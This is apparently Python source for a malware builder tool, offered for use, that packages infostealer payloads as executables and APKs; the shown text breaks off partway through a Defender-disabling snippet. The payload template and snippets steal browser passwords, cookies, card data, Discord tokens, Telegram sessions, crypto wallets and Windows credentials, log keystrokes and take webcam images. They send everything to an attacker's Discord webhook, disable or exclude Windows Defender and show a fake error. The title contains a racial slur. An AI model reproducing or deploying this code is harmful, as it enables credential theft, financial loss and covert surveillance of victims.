import customtkinter as ctk
import tkinter as tk
from tkinter import filedialog, messagebox
import os, sys, json, shutil, requests, subprocess, base64, sqlite3, textwrap, py_compile, zipfile, tempfile, hashlib, random, string, re
from pathlib import Path
from datetime import datetime
from string import Template
from threading import Thread

COLORS = {
    "bg": "#08080a", "frame_bg": "#121216", "accent": "#9b59b6",
    "accent_hover": "#7d3c98", "accent_glow": "#b87fd9",
    "text": "#d4d4dc", "text_dim": "#8a8a96", "entry_bg": "#1c1c22",
    "success": "#27ae60", "danger": "#c0392b", "warning": "#f39c12",
    "console_bg": "#0a0a0e"
}
ctk.set_appearance_mode("dark")
BUILDER_TITLE = "⚡ NIGGA FUCKER v8.0 — INE - BY NODE (APK + EXE + PY)"
OUTPUT_DIR = "output"

PAYLOAD_DEPS = [
    "browser_cookie3","cryptography","cv2","mss","PIL",
    "pynput.keyboard","pywin32","win32crypt","win32cred",
    "requests","urllib3","chardet","certifi","idna",
]

def test_webhook(url):
    try:
        r = requests.post(url, json={"content": "```⚡ ping```"}, timeout=10)
        return (r.status_code == 204, f"HTTP {r.status_code}" if r.status_code != 204 else "✅ Webhook works!")
    except Exception as e:
        return (False, str(e)[:80])

def check_pyinstaller():
    try:
        r = subprocess.run([sys.executable, "-m", "PyInstaller", "--version"],
                           capture_output=True, text=True, timeout=10)
        return (r.returncode == 0, r.stdout.strip() if r.returncode == 0 else r.stderr[:200])
    except Exception as e:
        return (False, str(e)[:100])

def check_android_tools():
    """Check for Android SDK/build tools availability."""
    tools = {}
    try:
        r = subprocess.run(["java", "-version"], capture_output=True, text=True, timeout=10)
        tools["java"] = r.returncode == 0
    except:
        tools["java"] = False
    
    try:
        r = subprocess.run(["keytool", "-help"], capture_output=True, text=True, timeout=10)
        tools["keytool"] = r.returncode == 0
    except:
        tools["keytool"] = False
    
    for apksigner_path in [
        "apksigner",
        os.path.join(os.environ.get("ANDROID_HOME", ""), "build-tools", "*", "apksigner") if os.environ.get("ANDROID_HOME") else "",
        os.path.join(os.environ.get("ANDROID_SDK_ROOT", ""), "build-tools", "*", "apksigner") if os.environ.get("ANDROID_SDK_ROOT") else "",
    ]:
        try:
            if "*" in apksigner_path:
                import glob
                matches = glob.glob(apksigner_path)
                if matches:
                    apksigner_path = sorted(matches)[-1]  # Use latest build-tools
            r = subprocess.run([apksigner_path, "--version"], capture_output=True, text=True, timeout=10)
            if r.returncode == 0:
                tools["apksigner"] = apksigner_path
                break
        except:
            pass
    if "apksigner" not in tools:
        tools["apksigner"] = False
    
    return tools

def generate_keystore(keystore_path, password="android", alias="payload"):
    """Generate a debug keystore for APK signing."""
    try:
        dname = "CN=Android Debug, O=Android, C=US"
        cmd = [
            "keytool", "-genkey", "-v",
            "-keystore", keystore_path,
            "-alias", alias,
            "-keyalg", "RSA",
            "-keysize", "2048",
            "-validity", "10000",
            "-storepass", password,
            "-keypass", password,
            "-dname", dname
        ]
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return r.returncode == 0
    except Exception as e:
        return False

def add_self_exclusion():
    """Add the output directory to Defender exclusions so payloads survive."""
    try:
        paths = [
            os.path.abspath(OUTPUT_DIR),
            os.path.abspath(os.path.join(OUTPUT_DIR, "_build_temp")),
        ]
        for p in paths:
            os.makedirs(p, exist_ok=True)
            subprocess.run(
                ["powershell", "-Command", f'Add-MpPreference -ExclusionPath "{p}" -Force -ErrorAction SilentlyContinue'],
                capture_output=True, timeout=5, creationflags=0x08000000
            )
        return True
    except:
        return False

def icon_to_ico(icon_path):
    if icon_path.lower().endswith('.ico'):
        return icon_path
    try:
        from PIL import Image
        img = Image.open(icon_path)
        ico_path = os.path.join(OUTPUT_DIR, "_icon_temp.ico")
        img.save(ico_path, format='ICO', sizes=[(256, 256)])
        return ico_path
    except:
        return None

def validate_payload_code(py_path):
    try:
        with open(py_path, 'r', encoding='utf-8') as f:
            source = f.read()
        compile(source, py_path, 'exec')
        return (True, "Syntax OK — ready for PyInstaller")
    except SyntaxError as e:
        return (False, f"SyntaxError at line {e.lineno}: {e.msg}\n{e.text}")
    except Exception as e:
        return (False, str(e))

PAYLOAD_TEMPLATE = Template(r'''
import sys, os

DESKTOP = os.path.join(os.environ.get("USERPROFILE",""), "Desktop")
CRASH_LOG = os.path.join(DESKTOP, "INE_CRASH.txt")

def crash_log(msg):
    try:
        with open(CRASH_LOG, "a", encoding="utf-8") as f:
            from datetime import datetime
            f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}\n")
    except: pass

try:
    crash_log("=== PAYLOAD STARTED ===")

    if sys.platform == "win32":
        import ctypes
        try: ctypes.windll.kernel32.FreeConsole()
        except: pass
        try:
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd: ctypes.windll.user32.ShowWindow(hwnd, 0)
        except: pass

    def is_admin():
        try: return ctypes.windll.shell32.IsUserAnAdmin()
        except: return False

    if not is_admin():
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join([f'"{{a}}"' for a in sys.argv]), None, 0
            )
        except: pass
        sys.exit(0)

    try: ctypes.windll.kernel32.FreeConsole()
    except: pass

    crash_log("Admin obtained")

    try:
        import requests
        crash_log(f"requests imported: {requests.__version__}")
    except Exception as e:
        crash_log(f"REQUESTS IMPORT FAILED: {e}")
        import subprocess
        try:
            subprocess.check_call([sys.executable,"-m","pip","install","requests","--quiet"],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                  creationflags=0x08000000)
            import requests
            crash_log("requests installed and imported")
        except Exception as e2:
            crash_log(f"FATAL: Cannot import requests: {e2}")
            raise SystemExit("No requests module available")

    import subprocess, shutil, sqlite3, json, base64, re, zipfile, platform, socket, getpass, time
    from pathlib import Path
    from datetime import datetime
    from concurrent.futures import ThreadPoolExecutor, as_completed
    from threading import Lock, Thread, Event

    WEBHOOK = "$webhook"
    TEMP = os.environ.get("TEMP","C:\\Windows\\Temp")
    OUT = os.path.join(TEMP, "INE_" + datetime.now().strftime("%Y%m%d_%H%M%S"))
    os.makedirs(OUT, exist_ok=True)

    RESULTS = []
    RESULT_LOCK = Lock()
    KEYLOGGER_DATA = []
    KEYLOGGER_LOCK = Lock()
    KEYLOGGER_STOP = Event()
    MUTEX_NAME = "$mutex_name"

    $anti_spam_check

    DEBUG_LOG = os.path.join(OUT, "debug.log")
    LOG_LOCK = Lock()
    def dlog(msg):
        try:
            with LOG_LOCK:
                with open(DEBUG_LOG,"a",encoding="utf-8") as f:
                    f.write(f"[{datetime.now().strftime('%H:%M:%S.%f')[:-3]}] {msg}\n")
            crash_log(msg)
        except: pass

    dlog("=== V7.4 STARTED ===")

    $anti_vm_check

    BROWSER_PROCESSES = [
        "chrome.exe","msedge.exe","brave.exe","opera.exe","vivaldi.exe",
        "firefox.exe","kometa.exe","orbitum.exe","centbrowser.exe",
        "7star.exe","sputnik.exe","epicprivacybrowser.exe",
        "uran.exe","yandex.exe","iridium.exe"
    ]
    for proc in BROWSER_PROCESSES:
        try:
            subprocess.run(["taskkill","/F","/IM",proc], capture_output=True, timeout=3,
                           creationflags=0x08000000)
        except: pass
    time.sleep(0.3)

    PING_TYPE = "$ping_type"

    def send_file_now(filename, filepath):
        if not os.path.exists(filepath) or os.path.getsize(filepath)==0: return False
        try:
            with open(filepath,"rb") as f:
                r = requests.post(WEBHOOK, files={"file":(filename,f)}, timeout=15)
            crash_log(f"SENT FILE {filename} -> HTTP {r.status_code}")
            return r.status_code in (200,204)
        except Exception as e:
            crash_log(f"SEND FILE FAIL {filename}: {e}")
            return False

    def send_text_now(label, content):
        if not content or not content.strip():
            return
        try:
            prefix = ""
            if PING_TYPE == "Everyone":
                prefix = "@everyone "
            elif PING_TYPE == "Here":
                prefix = "@here "
            payload = prefix + f"**{label}**\n```\n{content[:1900]}\n```"
            requests.post(WEBHOOK, json={"content": payload}, timeout=15)
        except Exception as e:
            dlog(f"SEND TEXT FAIL {label}: {e}")

    def send_embed_now(title, description, fields=None, color=0x9b59b6):
        prefix = ""
        if PING_TYPE == "Everyone":
            prefix = "@everyone "
        elif PING_TYPE == "Here":
            prefix = "@here "

        embed = {
            "title": title,
            "description": description,
            "color": color,
            "timestamp": datetime.utcnow().isoformat(),
            "footer": {"text": f"INE v8.0 | {socket.gethostname()}"}
        }
        if fields:
            embed["fields"] = fields

        payload = {
            "embeds": [embed]
        }
        if prefix:
            payload["content"] = prefix

        try:
            requests.post(WEBHOOK, json=payload, timeout=15)
        except Exception as e:
            dlog(f"SEND EMBED FAIL: {e}")

    crash_log("Testing webhook connection...")
    prefix = ""
    if PING_TYPE == "Everyone": prefix = "@everyone "
    elif PING_TYPE == "Here": prefix = "@here "
    r = requests.post(WEBHOOK, json={"content": prefix + "```🔌 INE v8.0 connected```"}, timeout=10)

    def get_chrome_key(browser_path):
        try:
            import win32crypt
            local_state = os.path.join(browser_path,"Local State")
            if not os.path.exists(local_state): return None
            with open(local_state,"r",encoding="utf-8") as f: state = json.load(f)
            encrypted_key = base64.b64decode(state["os_crypt"]["encrypted_key"])
            return win32crypt.CryptUnprotectData(encrypted_key[5:],None,None,None,0)[1]
        except: return None

    def decrypt_aesgcm(encrypted_value, key):
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            return AESGCM(key).decrypt(encrypted_value[3:15], encrypted_value[15:], None).decode("utf-8",errors="replace")
        except: return None

    def get_chromium_browsers():
        browsers = []
        local = os.environ.get("LOCALAPPDATA","")
        appdata = os.environ.get("APPDATA","")
        candidates = [
            ("Chrome",os.path.join(local,"Google","Chrome","User Data")),
            ("Edge",os.path.join(local,"Microsoft","Edge","User Data")),
            ("Brave",os.path.join(local,"BraveSoftware","Brave-Browser","User Data")),
            ("Opera",os.path.join(appdata,"Opera Software","Opera Stable")),
            ("Vivaldi",os.path.join(local,"Vivaldi","User Data")),
            ("Kometa",os.path.join(local,"Kometa","User Data")),
            ("Orbitum",os.path.join(local,"Orbitum","User Data")),
            ("CentBrowser",os.path.join(local,"CentBrowser","User Data")),
            ("7Star",os.path.join(local,"7Star","7Star","User Data")),
            ("Sputnik",os.path.join(local,"Sputnik","User Data")),
            ("EpicPrivacy",os.path.join(local,"Epic Privacy Browser","User Data")),
            ("Uran",os.path.join(local,"uCozMedia","Uran","User Data")),
            ("Yandex",os.path.join(local,"Yandex","YandexBrowser","User Data")),
            ("Iridium",os.path.join(local,"Iridium","User Data")),
        ]
        for name, path in candidates:
            if os.path.exists(path): browsers.append((name,path))
        return browsers

    def record_result(category, filepath):
        if os.path.exists(filepath) and os.path.getsize(filepath)>0:
            with RESULT_LOCK:
                RESULTS.append((category, os.path.basename(filepath), os.path.getsize(filepath)))
            return True
        return False

$system_info
$telegram
$extensions
$wallets
$roblox
$credit_cards
$passwords
$cookies
$history
$downloads
$search
$discord
$passkeys
$webcam
$screenshot
$keylogger_scraper
$fake_error
$disable_defender
$add_exclusion
$startup
$authenticator
$wifi
$clipboard
$common_files
$games
$self_destruct

    scrapers = []
$scraper_list

    keylogger_thread = None
$start_keylogger

    dlog(f"Starting {len(scrapers)} scrapers (15s timeout each)")
    completed = 0
    SCRAPER_TIMEOUT = 15

    with ThreadPoolExecutor(max_workers=min(len(scrapers), 10)) as executor:
        futures = {executor.submit(fn): fn.__name__ for fn in scrapers}
        for future in as_completed(futures):
            name = futures[future]
            try:
                future.result(timeout=SCRAPER_TIMEOUT)
                completed += 1
                dlog(f"  ✓ {name} ({completed}/{len(scrapers)})")
            except Exception as e:
                dlog(f"  ✗ {name}: {e}")

$stop_keylogger

    dlog(f"SEND PHASE — {len(RESULTS)} results")
    crash_log(f"Sending {len(RESULTS)} results to webhook...")

    send_file_now("debug_full.log", DEBUG_LOG)

    if len(RESULTS) > 0:
        fields = []
        for cat, fname, size in RESULTS:
            size_str = f"{size:,}B" if size<1024 else f"{size/1024:.1f}KB" if size<1048576 else f"{size/1048576:.1f}MB"
            fields.append({"name":f"📄 {cat}","value":f"`{fname}` — {size_str}","inline":True})
        send_embed_now("🧬 Harvest Complete",
                       f"**Machine:** {socket.gethostname()}\n**User:** {getpass.getuser()}\n**Files:** {len(RESULTS)}",
                       fields=fields[:25])
        for cat, fname, size in RESULTS:
            send_file_now(f"{cat} - {fname}", os.path.join(OUT, fname))
    else:
        send_embed_now("❌ Harvest Failed",
                       f"**Machine:** {socket.gethostname()}\nNo data collected. Check debug_full.log or INE_CRASH.txt on desktop.",
                       color=0xc0392b)
        if os.path.exists(CRASH_LOG):
            send_file_now("INE_CRASH.txt", CRASH_LOG)

    try:
        zp = os.path.join(TEMP, f"harvest_{socket.gethostname()}")
        shutil.make_archive(zp, "zip", OUT)
        send_file_now("harvest_full.zip", zp + ".zip")
        crash_log("harvest_full.zip sent")
    except Exception as e:
        crash_log(f"zip failed: {e}")

    try: shutil.rmtree(OUT, ignore_errors=True)
    except: pass
    crash_log("=== PAYLOAD COMPLETE ===")

    $self_destruct_call

except Exception as GLOBAL_ERROR:
    crash_log(f"FATAL UNHANDLED ERROR: {GLOBAL_ERROR}")
    import traceback
    crash_log(traceback.format_exc())
    try:
        if os.path.exists(CRASH_LOG) and WEBHOOK:
            with open(CRASH_LOG, "rb") as f:
                requests.post(WEBHOOK, files={"file":("FATAL_CRASH.txt",f)}, timeout=10)
    except: pass
''')

SNIPPETS = {
    "system_info": '''
def scrape_system_info():
    try:
        ip = requests.get("https://api.ipify.org", timeout=5).text
        info = f"Hostname: {socket.gethostname()}\\nOS: {platform.platform()}\\nUser: {getpass.getuser()}\\nIP: {ip}\\nAdmin: YES"
        path = os.path.join(OUT, "system_info.txt")
        with open(path, "w") as f: f.write(info)
        record_result("System Info", path)
    except Exception as e: dlog(f"system_info FAIL: {e}")
''',
    "telegram": '''
def scrape_telegram():
    try:
        tdata = os.path.join(os.environ.get("APPDATA",""), "Telegram Desktop", "tdata")
        if os.path.exists(tdata):
            dest = os.path.join(OUT, "Telegram_tdata")
            shutil.copytree(tdata, dest, dirs_exist_ok=True)
            zp = os.path.join(OUT, "telegram_sessions.zip")
            shutil.make_archive(zp.replace(".zip",""), "zip", dest)
            shutil.rmtree(dest, ignore_errors=True)
            record_result("Telegram", zp)
    except Exception as e: dlog(f"telegram FAIL: {e}")
''',
    "extensions": '''
def scrape_extensions():
    try:
        for name, ua in get_chromium_browsers():
            for prof in os.listdir(ua):
                if not (prof.startswith("Default") or prof.startswith("Profile")): continue
                ext_dir = os.path.join(ua, prof, "Extensions")
                if os.path.exists(ext_dir):
                    dest = os.path.join(OUT, f"extensions_{name}_{prof}")
                    shutil.copytree(ext_dir, dest, dirs_exist_ok=True)
        if any("extensions_" in x for x in os.listdir(OUT)):
            zp = os.path.join(OUT, "extensions.zip")
            shutil.make_archive(zp.replace(".zip",""), "zip", OUT)
            record_result("Extensions", zp)
    except Exception as e: dlog(f"extensions FAIL: {e}")
''',
    "wallets": '''
def scrape_wallets():
    try:
        wallet_paths = {
            "Exodus": os.path.join(os.environ.get("APPDATA",""),"Exodus","exodus.wallet"),
            "Atomic": os.path.join(os.environ.get("APPDATA",""),"atomic","Local Storage","leveldb"),
            "Electrum": os.path.join(os.environ.get("APPDATA",""),"Electrum","wallets"),
            "Coinomi": os.path.join(os.environ.get("APPDATA",""),"Coinomi","Coinomi","wallets"),
            "Guarda": os.path.join(os.environ.get("APPDATA",""),"Guarda","Local Storage","leveldb"),
        }
        found = 0
        for wname, wpath in wallet_paths.items():
            if os.path.exists(wpath):
                dest = os.path.join(OUT, "Wallets", wname)
                os.makedirs(dest, exist_ok=True)
                if os.path.isdir(wpath): shutil.copytree(wpath, dest, dirs_exist_ok=True)
                else: shutil.copy2(wpath, dest)
                found += 1
        if found:
            zp = os.path.join(OUT, "wallets.zip")
            shutil.make_archive(zp.replace(".zip",""), "zip", os.path.join(OUT,"Wallets"))
            record_result("Wallets", zp)
    except Exception as e: dlog(f"wallets FAIL: {e}")
''',
    "roblox": '''
def scrape_roblox():
    try:
        roblox_cookies = []
        try:
            import browser_cookie3
            for c in browser_cookie3.load():
                if ".roblox.com" in c.domain:
                    roblox_cookies.append(f"{c.domain}\\t{c.name}\\t{c.value}")
        except: pass
        for bname, ua in get_chromium_browsers():
            key = get_chrome_key(ua)
            if not key: continue
            for prof in os.listdir(ua):
                if not (prof.startswith("Default") or prof.startswith("Profile")): continue
                cookies_db = os.path.join(ua, prof, "Network", "Cookies")
                if not os.path.exists(cookies_db): cookies_db = os.path.join(ua, prof, "Cookies")
                if not os.path.exists(cookies_db): continue
                tmp = os.path.join(TEMP, f"rbx_{bname}_{prof}.db")
                try:
                    shutil.copy2(cookies_db, tmp)
                    conn = sqlite3.connect(tmp)
                    cur = conn.cursor()
                    cur.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%.roblox.com'")
                    for host, name, enc_val in cur.fetchall():
                        dec = decrypt_aesgcm(enc_val, key)
                        if dec:
                            roblox_cookies.append(f"{host}\\t{name}\\t{dec}")
                    conn.close()
                    os.remove(tmp)
                except:
                    if os.path.exists(tmp): os.remove(tmp)
        path = os.path.join(OUT, "roblox_cookies.txt")
        with open(path, "w", encoding="utf-8") as f:
            f.write("\\n".join(set(roblox_cookies)) if roblox_cookies else "No Roblox cookies found.")
        record_result("Roblox Cookies", path)
    except Exception as e: dlog(f"roblox FAIL: {e}")
''',
    "credit_cards": '''
def scrape_credit_cards():
    try:
        cards = []
        for bname, ua in get_chromium_browsers():
            for prof in os.listdir(ua):
                if not (prof.startswith("Default") or prof.startswith("Profile")): continue
                webdata = os.path.join(ua, prof, "Web Data")
                if not os.path.exists(webdata): continue
                tmp = os.path.join(TEMP, f"cc_{bname}_{prof}.db")
                try:
                    shutil.copy2(webdata, tmp)
                    conn = sqlite3.connect(tmp)
                    cur = conn.cursor()
                    cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                    for row in cur.fetchall():
                        cards.append(f"[{bname}/{prof}] {row[0]} | Exp: {row[1]}/{row[2]} | Encrypted: {row[3][:30]}...")
                    conn.close()
                    os.remove(tmp)
                except:
                    if os.path.exists(tmp): os.remove(tmp)
        path = os.path.join(OUT, "credit_cards.txt")
        with open(path, "w", encoding="utf-8") as f:
            f.write("\\n".join(cards) if cards else "No credit cards found.")
        record_result("Credit Cards", path)
    except Exception as e: dlog(f"credit_cards FAIL: {e}")
''',
    "passwords": '''
def scrape_passwords():
    try:
        pwds = []
        for bname, ua in get_chromium_browsers():
            key = get_chrome_key(ua)
            for prof in os.listdir(ua):
                if not (prof.startswith("Default") or prof.startswith("Profile")): continue
                login_db = os.path.join(ua, prof, "Login Data")
                if not os.path.exists(login_db): continue
                tmp = os.path.join(TEMP, f"pwd_{bname}_{prof}.db")
                try:
                    shutil.copy2(login_db, tmp)
                    conn = sqlite3.connect(tmp)
                    cur = conn.cursor()
                    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for url, user, enc_pwd in cur.fetchall():
                        dec = decrypt_aesgcm(enc_pwd, key) if key and enc_pwd else "(empty)"
                        pwds.append(f"{url} | {user} | {dec}")
                    conn.close()
                    os.remove(tmp)
                except:
                    if os.path.exists(tmp): os.remove(tmp)
        path = os.path.join(OUT, "passwords.txt")
        with open(path, "w", encoding="utf-8") as f:
            f.write("\\n".join(pwds) if pwds else "No passwords found.")
        record_result("Passwords", path)
    except Exception as e: dlog(f"passwords FAIL: {e}")
''',
    "cookies": '''
def scrape_cookies():
    try:
        import browser_cookie3
        path = os.path.join(OUT, "cookies.txt")
        count = 0
        with open(path, "w", encoding="utf-8") as f:
            for c in browser_cookie3.load():
                f.write(f"{c.domain}\\t{c.name}\\t{c.value}\\n")
                count += 1
        record_result("Browser Cookies", path)
    except Exception as e: dlog(f"cookies FAIL: {e}")
''',
    "history": '''
def scrape_history():
    try:
        entries = []
        for bname, ua in get_chromium_browsers():
            for prof in os.listdir(ua):
                if not (prof.startswith("Default") or prof.startswith("Profile")): continue
                hist_db = os.path.join(ua, prof, "History")
                if not os.path.exists(hist_db): continue
                tmp = os.path.join(TEMP, f"hist_{bname}_{prof}.db")
                try:
                    shutil.copy2(hist_db, tmp)
                    conn = sqlite3.connect(tmp)
                    cur = conn.cursor()
                    cur.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 300")
                    for url, title, t in cur.fetchall(): entries.append(f"[{bname}] {url} | {title}")
                    conn.close()
                    os.remove(tmp)
                except:
                    if os.path.exists(tmp): os.remove(tmp)
        path = os.path.join(OUT, "browser_history.txt")
        with open(path, "w", encoding="utf-8") as f:
            f.write("\\n".join(entries) if entries else "No history found.")
        record_result("Browser History", path)
    except Exception as e: dlog(f"history FAIL: {e}")
''',
    "downloads": '''
def scrape_downloads():
    try:
        entries = []
        for bname, ua in get_chromium_browsers():
            for prof in os.listdir(ua):
                if not (prof.startswith("Default") or prof.startswith("Profile")): continue
                hist_db = os.path.join(ua, prof, "History")
                if not os.path.exists(hist_db): continue
                tmp = os.path.join(TEMP, f"dl_{bname}_{prof}.db")
                try:
                    shutil.copy2(hist_db, tmp)
                    conn = sqlite3.connect(tmp)
                    cur = conn.cursor()
                    cur.execute("SELECT target_path, tab_url, total_bytes FROM downloads ORDER BY start_time DESC LIMIT 300")
                    for path_dl, url, size in cur.fetchall():
                        entries.append(f"[{bname}] {path_dl} | {url} | {size} bytes")
                    conn.close()
                    os.remove(tmp)
                except:
                    if os.path.exists(tmp): os.remove(tmp)
        path = os.path.join(OUT, "downloads_history.txt")
        with open(path, "w", encoding="utf-8") as f:
            f.write("\\n".join(entries) if entries else "No download history.")
        record_result("Download History", path)
    except Exception as e: dlog(f"downloads FAIL: {e}")
''',
    "search": r'''
def scrape_search():
    dlog("search: starting...")
    entries = []
    try:
        for bname, ua in get_chromium_browsers():
            for prof in os.listdir(ua):
                if not (prof.startswith("Default") or prof.startswith("Profile")):
                    continue
                hist_db = os.path.join(ua, prof, "History")
                if not os.path.exists(hist_db):
                    continue
                tmp = os.path.join(TEMP, f"search_{bname}_{prof}.db")
                try:
                    shutil.copy2(hist_db, tmp)
                    conn = sqlite3.connect(tmp)
                    cur = conn.cursor()
                    try:
                        cur.execute("SELECT term FROM keyword_search_terms ORDER BY last_visit_time DESC LIMIT 300")
                        for (term,) in cur.fetchall():
                            entries.append(f"[{bname}] {term}")
                    except:
                        cur.execute("SELECT url FROM urls WHERE url LIKE '%search?q=%' OR url LIKE '%query=%' ORDER BY last_visit_time DESC LIMIT 300")
                        for (url,) in cur.fetchall():
                            entries.append(f"[{bname}/url] {url[:200]}")
                    conn.close()
                    os.remove(tmp)
                except:
                    if os.path.exists(tmp):
                        os.remove(tmp)
    except Exception as e:
        dlog(f"search: browser crawl error: {e}")
    
    path = os.path.join(OUT, "search_history.txt")
    with open(path, "w", encoding="utf-8") as f:
        f.write("\n".join(entries) if entries else "No search history found.")
    record_result("Search History", path)
    dlog(f"search: {len(entries)} entries written")
''',   
    "discord": '''
def scrape_discord():
    try:
        tokens = []
        local = os.environ.get("LOCALAPPDATA","")
        roaming = os.environ.get("APPDATA","")
        paths = [
            os.path.join(local,"Discord"), os.path.join(local,"DiscordCanary"), os.path.join(local,"DiscordPTB"),
            os.path.join(roaming,"discord"), os.path.join(roaming,"discordcanary"), os.path.join(roaming,"discordptb"),
        ]
        for dp in paths:
            if not os.path.exists(dp): continue
            for root, _, files in os.walk(dp):
                for f in files:
                    if f.endswith(".ldb") or f.endswith(".log"):
                        try:
                            with open(os.path.join(root,f),"r",errors="ignore") as lf:
                                for line in lf:
                                    for t in re.findall(r"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}", line):
                                        tokens.append(t)
                        except: pass
        path = os.path.join(OUT, "discord_tokens.txt")
        uniq = list(set(tokens))
        with open(path, "w", encoding="utf-8") as f:
            f.write("\\n".join(uniq) if uniq else "No Discord tokens found.")
        record_result("Discord Tokens", path)
        if uniq: send_text_now("🎮 Discord Tokens", "\\n".join(uniq[:10]))
    except Exception as e: dlog(f"discord FAIL: {e}")
''',
    "passkeys": r'''
def scrape_passkeys():
    dlog("passkeys: starting hybrid sweep...")
    passkeys = []

    try:
        for bname, ua in get_chromium_browsers():
            for prof in os.listdir(ua):
                if not (prof.startswith("Default") or prof.startswith("Profile")):
                    continue
                login_db = os.path.join(ua, prof, "Login Data")
                if not os.path.exists(login_db):
                    continue
                tmp = os.path.join(TEMP, f"pk_{bname}_{prof}.db")
                try:
                    shutil.copy2(login_db, tmp)
                    conn = sqlite3.connect(tmp)
                    cur = conn.cursor()
                    cur.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='webauthn_credentials'")
                    if cur.fetchone():
                        cur.execute("SELECT relying_party_id, user_name, user_display_name FROM webauthn_credentials")
                        for rp_id, uname, dname in cur.fetchall():
                            passkeys.append(f"[WebAuthn/{bname}/{prof}] RP: {rp_id} | User: {uname} | Display: {dname}")
                    conn.close()
                    os.remove(tmp)
                except:
                    if os.path.exists(tmp):
                        os.remove(tmp)
    except Exception as e:
        dlog(f"passkeys: WebAuthn error: {e}")

    try:
        local = os.environ.get("LOCALAPPDATA","")
        roaming = os.environ.get("APPDATA","")
        for dp in [
            os.path.join(roaming, "discord"),
            os.path.join(roaming, "discordcanary"),
            os.path.join(roaming, "discordptb"),
            os.path.join(local, "Discord"),
            os.path.join(local, "DiscordCanary"),
            os.path.join(local, "DiscordPTB"),
        ]:
            if not os.path.exists(dp):
                continue
            for root, _, files in os.walk(dp):
                for f in files:
                    if f.endswith(".ldb") or f.endswith(".log"):
                        try:
                            fpath = os.path.join(root, f)
                            with open(fpath, "r", errors="ignore") as lf:
                                for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", lf.read()):
                                    passkeys.append(f"[Discord/Token] {token}")
                        except:
                            pass
    except Exception as e:
        dlog(f"passkeys: Discord error: {e}")

    try:
        import browser_cookie3
        for c in browser_cookie3.load():
            if ".roblox.com" in c.domain:
                passkeys.append(f"[Roblox/Cookie] {c.domain} | {c.name} | {c.value}")
    except:
        pass

    try:
        import win32cred
        creds = win32cred.CredEnumerate(None, 0)
        if creds:
            for cred in creds:
                target = cred.get("TargetName", "Unknown")
                username = cred.get("UserName", "")
                cred_type = cred.get("Type", "")
                passkeys.append(f"[WinVault] {target} | User: {username} | Type: {cred_type}")
    except:
        pass

    path = os.path.join(OUT, "passkeys.txt")
    uniq = list(set(passkeys))
    with open(path, "w", encoding="utf-8") as f:
        f.write("\n".join(uniq) if uniq else "No passkeys found (WebAuthn, Discord, Roblox, Windows Vault).")
    record_result("Passkeys", path)

    if uniq:
        send_text_now("\U0001f511 Passkeys & Tokens", "\n".join(uniq[:15]))
    else:
        send_text_now("\U0001f511 Passkeys", "No passkeys discovered on this host.")

    dlog(f"passkeys: {len(uniq)} entries written")
''',
    
    "webcam": '''
def scrape_webcam():
    try:
        import cv2
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            path = os.path.join(OUT, "webcam.jpg")
            cv2.imwrite(path, frame)
            record_result("Webcam", path)
        cam.release()
    except: pass
''',
    "screenshot": '''
def scrape_screenshot():
    try:
        path = os.path.join(OUT, "screenshot.png")
        try:
            import mss
            with mss.mss() as sct: sct.shot(output=path)
        except:
            from PIL import ImageGrab
            ImageGrab.grab().save(path)
        record_result("Screenshot", path)
    except: pass
''',
    "keylogger_scraper": '''
def keylogger_background():
    try:
        import pynput.keyboard
        def on_press(key):
            try:
                with KEYLOGGER_LOCK:
                    KEYLOGGER_DATA.append(key.char)
            except:
                with KEYLOGGER_LOCK:
                    KEYLOGGER_DATA.append(f"[{key}]")
        listener = pynput.keyboard.Listener(on_press=on_press)
        listener.start()
        dlog("keylogger: started")
        KEYLOGGER_STOP.wait(timeout=60)
        listener.stop()
        dlog(f"keylogger: stopped, {len(KEYLOGGER_DATA)} strokes")
    except Exception as e:
        dlog(f"keylogger FAIL: {e}")

def save_keylogger_results():
    try:
        with KEYLOGGER_LOCK:
            data = list(KEYLOGGER_DATA)
        if data:
            path = os.path.join(OUT, "keylog.txt")
            with open(path, "w", encoding="utf-8") as f:
                f.write("".join(data))
            record_result("Keylogger", path)
    except Exception as e:
        dlog(f"keylogger save FAIL: {e}")
''',
    "fake_error": '''
def show_fake_error():
    try:
        import tkinter.messagebox as mb
        mb.showerror("{title}", "{message}")
        dlog("fake_error: displayed")
    except: pass
''',
    "disable_defender": '''
def disable_windows_defender():
    try:
        dlog("disable_defender: starting...")
        defender_keys = [
            (r"SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", 1),
            (r"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", 1),
            (r"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", 1),
            (r"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", 1),
            (r"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", 1),
        ]
        import winreg
        for key_path, val_name, val_data in defender_keys:
            try:
                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                winreg.SetValueEx(key, val_name, 0, winreg.REG_DWORD, val_data)
                winreg.CloseKey(key)
                dlog(f"disable_defender: set {key_path}\\\\{val_name} = {val_data}")
            except Exception as e:
                dlog(f"disable_defender: registry fail {key_path}: {e}")
        ps_commands = [
            "Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue",
            "Set-MpPreference -DisableBehaviorMonitoring $true -Force -ErrorAction SilentlyContinue",
            "Set-MpPreference -DisableBlockAtFirstSeen $true -Force -ErrorAction SilentlyContinue",
